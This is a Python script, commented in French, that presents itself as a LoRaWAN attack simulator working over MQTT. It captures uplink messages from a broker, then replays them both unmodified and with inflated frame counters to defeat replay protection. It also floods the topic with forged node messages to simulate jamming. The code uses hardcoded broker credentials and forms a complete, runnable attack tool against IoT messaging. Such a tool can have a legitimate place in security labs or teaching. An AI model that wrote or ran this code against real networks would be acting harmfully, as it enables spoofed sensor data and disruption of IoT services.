import paho.mqtt.client as mqtt
import time
import json

# Configuration
MQTT_BROKER = "localhost"
MQTT_PORT = 1883
MQTT_TOPIC = "lorawan/uplink"
MQTT_AUTH_USER = "lorauser"
MQTT_AUTH_PASS = "lorapass"

class LoRaWANReplayAttack:
    def __init__(self):
        self.client = mqtt.Client(client_id="attacker", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
        self.client.username_pw_set(MQTT_AUTH_USER, MQTT_AUTH_PASS)
        self.client.on_connect = self.on_connect
        self.client.on_message = self.on_message
        self.captured_messages = []
        
    def on_connect(self, client, userdata, flags, rc, properties=None):
        print(f"Connecté au broker MQTT avec code {rc}")
        client.subscribe(MQTT_TOPIC)
        print(f"En écoute sur {MQTT_TOPIC} pour capturer des paquets...")
        
    def on_message(self, client, userdata, msg):
        print("Message intercepté!")
        message = json.loads(msg.payload.decode())
        self.captured_messages.append(msg.payload)
        print(f"Message capturé du nœud {message.get('dev_id', 'inconnu')}, frame #{message.get('counter', '?')}")
        
    def start_capture(self, duration=60):
        """Capture des messages pendant une durée spécifiée (en secondes)"""
        try:
            self.client.connect(MQTT_BROKER, MQTT_PORT, 60)
            self.client.loop_start()
            
            print(f"Démarrage de la capture pendant {duration} secondes...")
            start_time = time.time()
            
            while time.time() - start_time < duration:
                remaining = int(duration - (time.time() - start_time))
                if remaining % 10 == 0 and remaining != duration:
                    print(f"Capture en cours... {remaining} secondes restantes")
                time.sleep(1)
                
            self.client.loop_stop()
            print(f"Capture terminée. {len(self.captured_messages)} messages capturés.")
            
        except Exception as e:
            print(f"Erreur lors de la capture: {str(e)}")
            self.client.loop_stop()
    
    def replay_attack(self, delay_between_replays=5):
        """Rejoue les messages capturés"""
        if not self.captured_messages:
            print("Pas de messages à rejouer. Lancez d'abord start_capture().")
            return
            
        try:
            # Création d'un nouveau client pour l'attaque
            attack_client = mqtt.Client(client_id="replay_attacker", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            attack_client.username_pw_set(MQTT_AUTH_USER, MQTT_AUTH_PASS)
            attack_client.connect(MQTT_BROKER, MQTT_PORT, 60)
            
            print(f"Démarrage de l'attaque par rejeu avec {len(self.captured_messages)} messages...")
            
            for i, message in enumerate(self.captured_messages):
                print(f"Rejeu du message {i+1}/{len(self.captured_messages)}...")
                
                # Modification légère du message pour illustrer différentes techniques d'attaque
                try:
                    msg_dict = json.loads(message.decode())
                    
                    # 1. Attaque par rejeu simple (sans modification)
                    attack_client.publish(MQTT_TOPIC, message)
                    print(f"  Rejeu simple effectué pour le message du nœud {msg_dict.get('dev_id', 'inconnu')}")
                    time.sleep(delay_between_replays)
                    
                    # 2. Attaque par rejeu avec modification du compteur (tentative de contournement)
                    if 'counter' in msg_dict:
                        msg_dict['counter'] += 100  # Incrémentation artificielle du compteur
                        attack_client.publish(MQTT_TOPIC, json.dumps(msg_dict))
                        print(f"  Rejeu avec modification du compteur effectué: #{msg_dict['counter']}")
                    
                    time.sleep(delay_between_replays)
                    
                except Exception as e:
                    print(f"  Erreur lors de la modification du message: {str(e)}")
                    # Rejeu du message original en cas d'erreur
                    attack_client.publish(MQTT_TOPIC, message)
                    
                time.sleep(delay_between_replays)
                
            print("Attaque par rejeu terminée.")
            attack_client.disconnect()
            
        except Exception as e:
            print(f"Erreur lors de l'attaque: {str(e)}")
            
    def simulate_jamming(self, duration=30, rate=10):
        """Simule une attaque par brouillage (jamming) en inondant le canal de messages invalides"""
        try:
            # Création d'un client pour l'attaque de brouillage
            jamming_client = mqtt.Client(client_id="jammer", callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
            jamming_client.username_pw_set(MQTT_AUTH_USER, MQTT_AUTH_PASS)
            jamming_client.connect(MQTT_BROKER, MQTT_PORT, 60)
            
            print(f"Démarrage de l'attaque par brouillage pendant {duration} secondes...")
            start_time = time.time()
            
            msg_count = 0
            while time.time() - start_time < duration:
                # Création d'un message de brouillage aléatoire
                junk_message = {
                    "dev_id": f"fake_node_{msg_count % 100}",
                    "counter": msg_count,
                    "payload_raw": "SGVsbG8gV29ybGQ=",  # "Hello World" en base64
                    "metadata": {
                        "time": time.time(),
                        "frequency": 868.1,
                        "modulation": "LORA",
                        "data_rate": "SF7BW125"
                    }
                }
                
                # Publication du message de brouillage
                jamming_client.publish(MQTT_TOPIC, json.dumps(junk_message))
                msg_count += 1
                
                if msg_count % 10 == 0:
                    print(f"  {msg_count} messages de brouillage envoyés...")
                
                # Respecter le taux d'envoi spécifié
                time.sleep(1/rate)
                
            jamming_client.disconnect()
            print(f"Attaque par brouillage terminée. {msg_count} messages envoyés.")
            
        except Exception as e:
            print(f"Erreur lors de l'attaque par brouillage: {str(e)}")
    
def main():
    attacker = LoRaWANReplayAttack()
    
    print("Bienvenue dans le simulateur d'attaque LoRaWAN")
    print("1. Capture de paquets")
    print("2. Attaque par rejeu")
    print("3. Simulation de brouillage")
    print("4. Quitter")
    
    while True:
        choice = input("\nVotre choix (1-4): ")
        
        if choice == "1":
            duration = int(input("Durée de capture (secondes): ") or "60")
            attacker.start_capture(duration)
        elif choice == "2":
            if not attacker.captured_messages:
                print("Vous devez d'abord capturer des messages (option 1)")
                continue
            delay = int(input("Délai entre les rejeux (secondes): ") or "5")
            attacker.replay_attack(delay)
        elif choice == "3":
            duration = int(input("Durée de l'attaque (secondes): ") or "30")
            rate = int(input("Taux d'envoi (messages/seconde): ") or "10")
            attacker.simulate_jamming(duration, rate)
        elif choice == "4":
            print("Au revoir!")
            break
        else:
            print("Choix invalide.")

if __name__ == "__main__":
    main()